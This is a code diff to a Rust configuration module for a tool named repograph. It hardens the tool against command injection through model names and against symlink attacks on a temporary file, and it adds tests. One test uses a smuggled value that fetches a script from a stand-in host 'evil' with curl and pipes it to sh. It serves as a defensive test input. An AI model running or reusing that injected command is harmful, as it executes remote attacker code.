@@ -206,6 +206,16 @@ fn model_token_is_safe(v: &str) -> bool {
         && v.chars().all(|c| c.is_ascii_alphanumeric() || "._:/@+-".contains(c))
 }
 
+/// How a notice tells the reader to trust `model`. The name is a repository's text, so it is
+/// offered as a command only when it is a plain token: a crafted value cannot ride a copy-paste
+/// into the shell, and one that is not a token is not a hub id `repograph model` would fetch.
+pub(crate) fn trust_hint(model: &str) -> String {
+    match model_token_is_safe(model) {
+        true => format!("`repograph model {model}` trusts it on this machine"),
+        false => "it is not a plain hub id".to_string(),
+    }
+}
+
 impl Config {
     /// The project's `repograph.toml` over the machine's global file over the built-in defaults,
     /// key by key, with `REPOGRAPH_RERANK_MODEL` over all three. A
@@ -284,12 +294,8 @@ impl Config {
         }
         cfg.rerank_command = rerank_template.replace(MODEL_SLOT, &cfg.rerank_model);
         if names_model && !model_is_trusted(&cfg.embed_model) {
-            // The name is a repository's text: echoed escaped, and offered as a command only when
-            // it is a plain token, so a crafted value cannot ride a copy-paste into the shell.
-            let how = match model_token_is_safe(&cfg.embed_model) {
-                true => format!("`repograph model {}` trusts it on this machine", cfg.embed_model),
-                false => "it is not a plain hub id".to_string(),
-            };
+            // The name is a repository's text, so it is echoed escaped.
+            let how = trust_hint(&cfg.embed_model);
             let _ = writeln!(std::io::stderr(), "repograph.toml: embed_model {:?} is not a catalogued model, so it is not downloaded on a repository's word — {how}; using {}", cfg.embed_model, crate::index::embed::DEFAULT_MODEL);
             cfg.embed_model = crate::index::embed::DEFAULT_MODEL.into();
         }
@@ -429,7 +435,13 @@ pub fn set_embed_model(repo: &Path, model: &str) -> Result<std::path::PathBuf> {
     // otherwise write the same temporary file, and the second write can land between the first
     // write and its rename — a file that is half one run's text and half the other's.
     let tmp = path.with_extension(format!("toml.{}.tmp", std::process::id()));
-    std::fs::write(&tmp, after.as_bytes()).with_context(|| format!("write {}", tmp.display()))?;
+    // Opened without following a link: the name is guessable from the pid, and a clone chooses
+    // what sits at it.
+    let mut o = std::fs::OpenOptions::new();
+    o.write(true).create(true).truncate(true);
+    let mut f = crate::store::open_unlinked(&mut o, &tmp).with_context(|| format!("write {}", tmp.display()))?;
+    std::io::Write::write_all(&mut f, after.as_bytes()).with_context(|| format!("write {}", tmp.display()))?;
+    drop(f);
     if let Err(e) = crate::store::rename_over(&tmp, &path) {
         let _ = std::fs::remove_file(&tmp);
         return Err(e).with_context(|| format!("rename {}", path.display()));
@@ -821,6 +833,21 @@ mod tests {
         });
     }
 
+    #[cfg(unix)]
+    #[test]
+    fn a_link_a_clone_committed_at_the_temporary_name_is_not_written_through() {
+        let dir = tempfile::tempdir().unwrap();
+        let outside = dir.path().join("outside");
+        std::fs::write(&outside, "victim\n").unwrap();
+        let repo = dir.path().join("repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        let tmp = repo.join(PROJECT_FILE).with_extension(format!("toml.{}.tmp", std::process::id()));
+        std::os::unix::fs::symlink(&outside, &tmp).unwrap();
+        assert!(set_embed_model(&repo, crate::index::embed::RECOMMENDED).is_err());
+        assert_eq!(std::fs::read_to_string(&outside).unwrap(), "victim\n");
+        assert!(!repo.join(PROJECT_FILE).exists(), "nothing was renamed into place");
+    }
+
     #[test]
     fn a_file_that_names_nothing_is_not_a_file_that_configured_a_model() {
         let dir = tempfile::tempdir().unwrap();
@@ -1014,6 +1041,13 @@ mod tests {
             assert_eq!(cfg.rerank_model, "qwen2.5-coder:7b");
             assert!(cfg.rerank_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.rerank_command);
         });
+    }
+
+    #[test]
+    fn a_notice_offers_to_trust_a_model_only_when_its_name_is_a_token() {
+        assert!(trust_hint("acme/embed-1").contains("`repograph model acme/embed-1` trusts it"));
+        let crafted = trust_hint("x\n; curl https://evil/x | sh");
+        assert!(!crafted.contains("evil") && !crafted.contains('`'), "{crafted}");
     }
 
     #[test]
